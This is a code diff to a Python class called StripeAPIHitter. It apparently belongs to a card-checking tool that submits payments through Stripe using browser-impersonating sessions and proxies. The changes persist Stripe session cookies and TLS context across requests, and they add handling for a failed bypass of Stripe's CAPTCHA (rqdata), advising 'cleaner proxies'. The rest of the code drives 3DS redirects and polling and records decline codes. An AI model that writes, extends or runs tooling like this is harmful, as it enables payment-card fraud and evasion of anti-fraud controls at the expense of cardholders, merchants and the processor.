@@ -1339,9 +1339,7 @@ class StripeAPIHitter:
                             pi = intent_id
                             taken = time.time() - start
                             
-                            session = requests.Session()
-                            if proxies:
-                                session.proxies = proxies
+                            # Reuse _cffi_session to persist cookies (stripe_mid/stripe_sid) and TLS context
 
                             if res.get("status") in ["requires_action", "requires_source_action"]:
                                 next_action = res.get("next_action", {})
@@ -1386,9 +1384,8 @@ class StripeAPIHitter:
                                         reconfirm_headers = headers.copy()
                                         reconfirm_headers["Idempotency-Key"] = str(_uuid.uuid4())
                                         await asyncio.sleep(1)
-                                        reconfirm_res = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data,
-                                            proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                        reconfirm_res = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                            confirm_url, headers=reconfirm_headers, data=reconfirm_data, timeout=30))
                                         reconfirm_json = reconfirm_res.json()
                                         rc_pi = reconfirm_json.get('payment_intent') or reconfirm_json.get('setup_intent') or reconfirm_json
                                         if not isinstance(rc_pi, dict):
@@ -1433,7 +1430,7 @@ class StripeAPIHitter:
                                             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                                             "user-agent": profile["user_agent"]
                                         }
-                                        await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=redir_headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                        await loop.run_in_executor(None, lambda: _cffi_session.get(redirect_url, headers=redir_headers, timeout=15))
                                     await asyncio.sleep(2)
                                     state = "redirected"
                                     processed_auth = True
@@ -1472,9 +1469,8 @@ class StripeAPIHitter:
                                         "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
                                         "key": pk
                                     }
-                                    auth_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.post(
-                                        auth_url, headers=auth_headers, data=auth_data,
-                                        proxies=proxies, timeout=30, impersonate="chrome120"))
+                                    auth_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.post(
+                                        auth_url, headers=auth_headers, data=auth_data, timeout=30))
                                     auth_json = {}
                                     try:
                                         auth_json = auth_resp_raw.json()
@@ -1483,8 +1479,12 @@ class StripeAPIHitter:
                                         state = "3DS Attempt failed"
                                     processed_auth = True
                                 else:
-                                    result['decline_code'] = 'no_3ds_source'
-                                    result['error'] = f'3DS required but no source or redirect URL found'
+                                    if captcha_triggered or (isinstance(sdk.get('stripe_js'), dict) and 'rqdata' in sdk.get('stripe_js', {})):
+                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
+                                        result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
+                                    else:
+                                        result['decline_code'] = 'no_3ds_source'
+                                        result['error'] = f'3DS required but no source or redirect URL found'
                                     result['raw_response'] = confirm_json
                                     return result
 
@@ -1503,9 +1503,8 @@ class StripeAPIHitter:
                                         "origin": "https://js.stripe.com",
                                         "referer": "https://js.stripe.com/"
                                     }
-                                    poll_resp_raw = await loop.run_in_executor(None, lambda: cffi_requests.get(
-                                        poll_url, headers=poll_headers, proxies=proxies,
-                                        timeout=30, impersonate="chrome120"))
+                                    poll_resp_raw = await loop.run_in_executor(None, lambda: _cffi_session.get(
+                                        poll_url, headers=poll_headers, timeout=30))
                                     poll_json = poll_resp_raw.json()
                                     status_2 = poll_json.get('status')
                                     
@@ -1522,9 +1521,9 @@ class StripeAPIHitter:
                                     if isinstance(err, dict) and err.get('message'):
                                         result['decline_code'] = err.get('decline_code', err.get('code', status_2))
                                         result['error'] = err.get('message', 'Unknown error')
-                                    elif captcha_triggered and not source:
-                                        result['decline_code'] = 'stripe_captcha_blocked'
-                                        result['error'] = 'Stripe CAPTCHA (rqdata) blocked — no 3DS source available. Try cleaner proxies.'
+                                    elif captcha_triggered:
+                                        result['decline_code'] = 'stripe_captcha_bypass_failed'
+                                        result['error'] = 'Stripe CAPTCHA (rqdata) triggered and bypass could not resolve it. Try cleaner proxies.'
                                     else:
                                         result['decline_code'] = status_2 or '3ds_unknown'
                                         result['error'] = f"3ds_challenge_unresolved"
